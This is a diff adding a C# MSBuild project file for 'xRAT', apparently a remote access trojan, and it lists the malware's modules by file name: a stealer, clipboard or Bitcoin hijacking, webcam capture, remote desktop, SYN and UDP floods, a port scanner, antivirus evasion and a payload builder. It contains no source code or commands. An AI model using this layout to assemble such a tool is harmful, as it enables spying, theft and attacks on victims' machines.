@@ -1,0 +1,114 @@
+<?xml version='1.0' encoding='utf-8'?>
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003" DefaultTargets="Build">
+  <PropertyGroup>
+    <ProjectType>local</ProjectType>
+    <ProjectVersion>7.10.377</ProjectVersion>
+    <SchemaVersion>2.0</SchemaVersion>
+    <ProjectGuid>6f563671-6334-4792-85ae-f375ab5e2648</ProjectGuid>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <AssemblyName>xRAT</AssemblyName>
+    <OutputType>WinExe</OutputType>
+    <TargetFrameworkVersion>v2.0</TargetFrameworkVersion>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|x86' ">
+    <PlatformTarget>x86</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|x86' ">
+    <PlatformTarget>x86</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <Import Project="$(MSBuildBinPath)\Microsoft.CSharp.targets" />
+  <ItemGroup>
+    <Reference Include="Microsoft.VisualBasic" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="iniSettings" />
+    <Reference Include="System.Management" />
+    <Compile Include="AssemblyInfo.cs" />
+    <Compile Include="Global.cs" />
+    <Compile Include="Form0.cs" />
+    <Compile Include="Class10.cs" />
+    <Compile Include="Class2.cs" />
+    <Compile Include="Class6.cs" />
+    <Compile Include="xRAT\Avast.cs" />
+    <Compile Include="xRAT\bitcoinn.cs" />
+    <Compile Include="xRAT\Builder.cs" />
+    <Compile Include="xRAT\Chat.cs" />
+    <Compile Include="xRAT\Connection.cs" />
+    <Compile Include="xRAT\CountryLookup.cs" />
+    <Compile Include="xRAT\DL.cs" />
+    <Compile Include="xRAT\File_Manager.cs" />
+    <Compile Include="xRAT\Form1.cs" />
+    <Compile Include="xRAT\Form2.cs" />
+    <Compile Include="xRAT\hijackb.cs" />
+    <Compile Include="xRAT\HTTP_F.cs" />
+    <Compile Include="xRAT\IconInjector.cs" />
+    <Compile Include="xRAT\IP_Tracer.cs" />
+    <Compile Include="xRAT\ip.cs" />
+    <Compile Include="xRAT\FrmListen.cs" />
+    <Compile Include="xRAT\MSG.cs" />
+    <Compile Include="Class5.cs" />
+    <Compile Include="xRAT\My\MySettings.cs" />
+    <Compile Include="xRAT\noip.cs" />
+    <Compile Include="xRAT\notifyzone.cs" />
+    <Compile Include="xRAT\OpenURL.cs" />
+    <Compile Include="xRAT\PortScanner.cs" />
+    <Compile Include="xRAT\Process.cs" />
+    <Compile Include="xRAT\Processes.cs" />
+    <Compile Include="xRAT\RemoteDesktop.cs" />
+    <Compile Include="Class7.cs" />
+    <Compile Include="xRAT\Settings.cs" />
+    <Compile Include="Control0.cs" />
+    <Compile Include="xRAT\Stealer.cs" />
+    <Compile Include="xRAT\SYN.cs" />
+    <Compile Include="xRAT\SysInfo.cs" />
+    <Compile Include="xRAT\UDP.cs" />
+    <Compile Include="xRAT\Win8Progressbar.cs" />
+    <Compile Include="xRAT\WWebcam.cs" />
+    <Compile Include="_Module_{30A2E8D4-9520-41D7-B64F-217E322A9122}.cs" />
+    <Compile Include="Class1.cs" />
+    <EmbeddedResource Include="xRAT.notifyzone.resources" />
+    <EmbeddedResource Include="xRAT.MSG.resources" />
+    <EmbeddedResource Include="xRAT.Builder.resources" />
+    <EmbeddedResource Include="xRAT.OpenURL.resources" />
+    <EmbeddedResource Include="xRAT.Form1.resources" />
+    <EmbeddedResource Include="xRAT.Process.resources" />
+    <EmbeddedResource Include="xRAT.Resources.resources" />
+    <EmbeddedResource Include="xRAT.Chat.resources" />
+    <EmbeddedResource Include="xRAT.Avast.resources" />
+    <EmbeddedResource Include="xRAT.WWebcam.resources" />
+    <EmbeddedResource Include="xRAT.SYN.resources" />
+    <EmbeddedResource Include="xRAT.bitcoinn.resources" />
+    <EmbeddedResource Include="xRAT.Stealer.resources" />
+    <EmbeddedResource Include="xRAT.IP_Tracer.resources" />
+    <EmbeddedResource Include="xRAT.UDP.resources" />
+    <EmbeddedResource Include="xRAT.noip.resources" />
+    <EmbeddedResource Include="xRAT.Processes.resources" />
+    <EmbeddedResource Include="xRAT.HTTP_F.resources" />
+    <EmbeddedResource Include="xRAT.File_Manager.resources" />
+    <EmbeddedResource Include="xRAT.DL.resources" />
+    <EmbeddedResource Include="xRAT.SysInfo.resources" />
+    <EmbeddedResource Include="xRAT.RemoteDesktop.resources" />
+    <EmbeddedResource Include="xRAT.PortScanner.resources" />
+    <EmbeddedResource Include="xRAT.FrmListen.resources" />
+    <EmbeddedResource Include="xRAT.ip.resources" />
+    <EmbeddedResource Include="xRAT.hijackb.resources" />
+    <EmbeddedResource Include="xRAT.Form2.resources" />
+    <EmbeddedResource Include="xRAT.Settings.resources" />
+    <EmbeddedResource Include="aR3nbf8dQp2feLmk31.rFohpatkdxsVcxLfJKhM7.resources" />
+    <EmbeddedResource Include="aR3nbf8dQp2feLmk31.lSfgApatkdxsVcGcrktoFd.resources" />
+  </ItemGroup>
+</Project>
